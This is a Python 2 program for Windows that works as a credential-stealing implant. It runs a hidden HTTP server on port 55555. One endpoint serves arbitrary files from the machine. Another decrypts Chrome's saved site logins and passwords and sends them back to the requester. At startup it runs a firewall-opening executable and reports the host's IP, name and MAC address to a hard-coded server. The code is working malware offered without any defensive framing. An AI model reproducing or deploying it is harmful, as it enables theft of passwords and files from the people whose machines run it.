__author__ = 'nuaa-wangj'
from SocketServer import ThreadingMixIn
from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler
import re
from os import path
from os import getenv
import os
import sqlite3
import win32crypt
import httplib
import threading
import uuid
import socket
import time

class myHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            print(self.path)
            print('\n')
            m = re.search('getfile',self.path)
            if m is not None:
                newpath = self.path[self.path.find('/',1):]
                print(newpath)
                filename = newpath[0: newpath.find('/',1)]

                filepathtemp = newpath[newpath.find('/',1)+1:]
                isappdata = filepathtemp[0: filepathtemp.find('/',1)]
                if isappdata=='appdata':
                    finalpath = filepathtemp[filepathtemp.find('/',1):]
                    finalfilepath = getenv("APPDATA") +"\.."+finalpath+filename
                else:
                    finalfilepath = filepathtemp+filename
                finalfilepath = finalfilepath.replace('\\',"/")
                finalfilepath = finalfilepath.replace('*', ' ')
                print(filename)
                print(finalfilepath)
                filesize = path.getsize(finalfilepath)
                print('parse request1 \n')
                self.send_response(200)
                self.send_header('Accept-Ranges','none')
                self.send_header('Content-Type','application/octet-stream')
                self.send_header('Content-Length',str(filesize))
                self.send_header('Connection','close')
                self.end_headers()
                f = open(finalfilepath,'rb')
                self.wfile.write(f.read())
                f.close()
                return
            m = re.search('getchromepasswd',self.path)
            if m is not None:
                filename = getenv("APPDATA") + "\..\Local\Google\Chrome\User Data\Default\Login Data"
                conn = sqlite3.connect(filename)
                cursor = conn.cursor()
                # Get the results
                cursor.execute('SELECT action_url, username_value, password_value FROM logins')
                passwdlist = []
                for result in cursor.fetchall():
                # Decrypt the Password
                    password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
                    if password:
                        singlepw ='Site: ' + result[0] +' Username: ' + result[1] + ' Password: ' + password
                        passwdlist.append(singlepw)
                myfile = file('./chromepasswd.txt', 'wb')
                myfile.write(str(passwdlist))
                myfile.close()
                filesize = path.getsize('./chromepasswd.txt')
                print('parse request1 \n')
                self.send_response(200)
                self.send_header('Accept-Ranges','none')
                self.send_header('Content-Type','application/octet-stream')
                self.send_header('Content-Length',str(filesize))
                self.send_header('Connection','close')
                self.end_headers()
                f = open('./chromepasswd.txt','rb')
                self.wfile.write(f.read())
                f.close()
                os.remove('./chromepasswd.txt')
                return
        except IOError:
            self.send_error(404, 'File Not Found: %s' % self.path)

class ThreadingHttpServer(ThreadingMixIn, HTTPServer):
    pass

#add firewall rule
os.system('enableserver.exe')

def get_mac_address():
    mac=uuid.UUID(int = uuid.getnode()).hex[-12:]
    return ":".join([mac[e:e+2] for e in range(0,11,2)])

svname = socket.getfqdn(socket.gethostname(  ))

svaddrlist = socket.gethostbyname_ex(svname)
for i in svaddrlist[2]:
    print(i)
    if i[0:10]=='172.18.128':
        svaddr = i

def svstarted():
    httpClient = None
    time.sleep(10)
    try:
        requesturl = "/serverstarted/"+svaddr+"/"+svname+"/"+get_mac_address()
        print requesturl
        httpClient = httplib.HTTPConnection('172.18.128.131', 80)
        httpClient.request('GET', requesturl)
        response = httpClient.getresponse()
        print response.status
        print response.reason
        print response.read()
    except Exception, e:
        print e
    finally:
        if httpClient:
            httpClient.close()

threads =[]
t1 = threading.Thread(target=svstarted)
threads.append(t1)
for t in threads:
    t.setDaemon(True)
    t.start()

PORT_NUM = 55555
serverAddress = ("",PORT_NUM)
server = ThreadingHttpServer(serverAddress, myHandler)
print 'Started httpserver on port ', PORT_NUM
server.serve_forever()



